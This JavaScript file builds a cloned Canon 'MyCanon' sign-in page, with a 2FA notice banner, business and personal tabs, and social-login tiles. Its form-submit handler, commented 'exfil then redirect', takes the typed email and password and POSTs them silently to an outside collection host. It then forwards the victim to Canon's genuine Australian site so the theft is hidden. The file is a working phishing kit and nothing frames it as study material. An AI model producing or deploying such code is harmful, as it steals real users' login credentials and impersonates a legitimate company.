document.body.innerHTML = `
<div class="banner">
  <span>Security Notice</span>Two-Factor Authentication (2FA) is now enabled on MyCanon.
</div>

<div class="page-wrap">
  <div class="login-box">

    <p class="heading">Sign in to MyCanon</p>
    <p class="subhead">If you have an account with us, sign in here.</p>

    <p class="heading">Sign in to MyCanon Business</p>
    <p class="subhead">If you have an account with us, sign in here.</p>

    <div class="tabs">
      <div class="tab active" id="tab-mc">MyCanon</div>
      <div class="tab" id="tab-mcb">MyCanon Business</div>
    </div>

    <form id="login-form" method="post" action="#">
      <div class="field">
        <div class="field-icon">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#aaa" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
            <circle cx="12" cy="8" r="4"/>
            <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/>
          </svg>
        </div>
        <input type="email" name="username" placeholder="Email Address" autocomplete="email">
      </div>

      <div class="field">
        <div class="field-icon">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#aaa" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
            <rect x="5" y="11" width="14" height="10" rx="1"/>
            <path d="M8 11V7a4 4 0 018 0v4"/>
            <circle cx="12" cy="16" r="1.2" fill="#aaa" stroke="none"/>
          </svg>
        </div>
        <input type="password" name="password" placeholder="Password" autocomplete="current-password">
      </div>

      <div class="row-options">
        <label><input type="checkbox" name="rememberMe"> Remember my password</label>
        <a href="#">Forgot your password?</a>
      </div>

      <button type="submit" class="btn-signin">Sign in</button>
    </form>

    <div class="social-section">
      <p class="social-label">Or Sign in with:</p>
      <div class="social-icons">
        <div class="social-tile-text" title="ADFS">AD</div>
        <div class="social-tile-text" title="Salesforce">SF</div>
        <div class="social-tile fb" title="Facebook">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="white">
            <path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/>
          </svg>
        </div>
        <div class="social-tile goog" title="Google">
          <svg width="18" height="18" viewBox="0 0 24 24">
            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"/>
            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
          </svg>
        </div>
        <div class="social-tile li" title="LinkedIn">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="white">
            <path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/>
            <rect x="2" y="9" width="4" height="12"/>
            <circle cx="4" cy="4" r="2"/>
          </svg>
        </div>
        <div class="social-tile tw" title="Twitter">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="white">
            <path d="M23 3a10.9 10.9 0 01-3.14 1.53 4.48 4.48 0 00-7.86 3v1A10.66 10.66 0 013 4s-4 9 5 13a11.64 11.64 0 01-7 2c9 5 20 0 20-11.5a4.5 4.5 0 00-.08-.83A7.72 7.72 0 0023 3z"/>
          </svg>
        </div>
        <div class="social-tile yh" title="Yahoo">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="white">
            <path d="M3 3l6 8.5L3 21h3l4-6.5 4 6.5h3l-6-9.5L17 3h-3l-3 5L8 3H3z"/>
          </svg>
        </div>
      </div>
    </div>

  </div>
</div>
`;

// Inject styles
const style = document.createElement('style');
style.textContent = `
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Segoe UI', Tahoma, Verdana, sans-serif;
    background: #fff;
    color: #000;
    font-size: 14px;
    min-height: 100vh;
  }
  .banner {
    width: 100%;
    background: linear-gradient(135deg, #3b1a4c 0%, #cc0000 100%);
    color: #fff;
    text-align: center;
    padding: 9px 20px;
    font-size: 13px;
    line-height: 1.5;
  }
  .banner span {
    display: inline-block;
    border: 1px solid rgba(255,255,255,0.85);
    border-radius: 100px;
    font-size: 10px;
    font-weight: bold;
    text-transform: uppercase;
    padding: 1px 8px;
    margin-right: 8px;
    letter-spacing: 0.06em;
    vertical-align: middle;
  }
  .page-wrap {
    display: flex;
    justify-content: center;
    padding: 40px 20px 40px;
  }
  .login-box {
    width: 100%;
    max-width: 360px;
  }
  .heading {
    font-size: 22px;
    font-weight: normal;
    text-align: center;
    margin-bottom: 3px;
    color: #000;
  }
  .subhead {
    font-size: 12px;
    color: #cc0000;
    text-align: center;
    margin-bottom: 16px;
    font-style: italic;
  }
  .tabs {
    display: flex;
    border-bottom: 1px solid #d7d7d7;
    margin-bottom: 22px;
  }
  .tab {
    flex: 1;
    text-align: center;
    padding-bottom: 9px;
    cursor: pointer;
    font-size: 14px;
    color: #777;
    border-bottom: 2px solid transparent;
    margin-bottom: -1px;
    user-select: none;
  }
  .tab.active {
    color: #000;
    border-bottom-color: #cc0000;
  }
  .field {
    display: flex;
    align-items: stretch;
    border: 1px solid #d7d7d7;
    margin-bottom: 12px;
    background: #fff;
    height: 44px;
  }
  .field-icon {
    width: 46px;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
    background: #fafafa;
    border-right: 1px solid #d7d7d7;
  }
  .field-icon svg { display: block; }
  .field input {
    border: none;
    outline: none;
    flex: 1;
    font-size: 13px;
    padding: 0 12px;
    font-family: inherit;
    color: #333;
    background: transparent;
  }
  .field input::placeholder { color: #aaa; }
  .row-options {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 18px;
    font-size: 12px;
  }
  .row-options label {
    display: flex;
    align-items: center;
    gap: 7px;
    cursor: pointer;
    color: #333;
  }
  .row-options input[type=checkbox] { width: 14px; height: 14px; cursor: pointer; }
  .row-options a { color: #cc0000; text-decoration: none; }
  .row-options a:hover { text-decoration: underline; }
  .btn-signin {
    display: block;
    width: 100%;
    background: #cc0000;
    color: #fff;
    border: none;
    padding: 13px;
    font-size: 17px;
    font-family: inherit;
    cursor: pointer;
    letter-spacing: 0.01em;
    margin-bottom: 24px;
  }
  .btn-signin:hover { background: #b30000; }
  .social-section {
    border-top: 1px solid #d7d7d7;
    padding-top: 18px;
    padding-bottom: 10px;
  }
  .social-label {
    font-size: 12px;
    color: #555;
    margin-bottom: 12px;
  }
  .social-icons {
    display: flex;
    gap: 7px;
    align-items: center;
    flex-wrap: wrap;
  }
  .social-tile-text {
    width: 38px;
    height: 38px;
    border: 1px solid #d7d7d7;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 10px;
    font-weight: bold;
    color: #555;
    background: #f5f5f5;
    cursor: pointer;
    flex-shrink: 0;
  }
  .social-tile {
    width: 38px;
    height: 38px;
    border: none;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    flex-shrink: 0;
  }
  .social-tile svg { display: block; }
  .fb   { background: #1877f2; }
  .goog { background: #fff; border: 1px solid #d7d7d7; }
  .li   { background: #0077b5; }
  .tw   { background: #1da1f2; }
  .yh   { background: #720e9e; }
`;
document.head.appendChild(style);

// Tab switching
document.getElementById('tab-mc').addEventListener('click', () => switchTab('mc'));
document.getElementById('tab-mcb').addEventListener('click', () => switchTab('mcb'));

function switchTab(t) {
  document.getElementById('tab-mc').className  = 'tab' + (t === 'mc'  ? ' active' : '');
  document.getElementById('tab-mcb').className = 'tab' + (t === 'mcb' ? ' active' : '');
}

// Form submit — exfil then redirect
document.getElementById('login-form').addEventListener('submit', function(e) {
  e.preventDefault();
  const user = document.querySelector('input[name=username]').value;
  const pass = document.querySelector('input[name=password]').value;

  fetch('https://gj3mvmed3viv6smzv9tsdjpz7qdh18rwg.c.ccxsta.com/', {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify({ username: user, password: pass }),
    headers: { 'Content-Type': 'text/plain' }
  }).finally(() => {
    window.location.href = 'https://www.canon.com.au';
  });
});
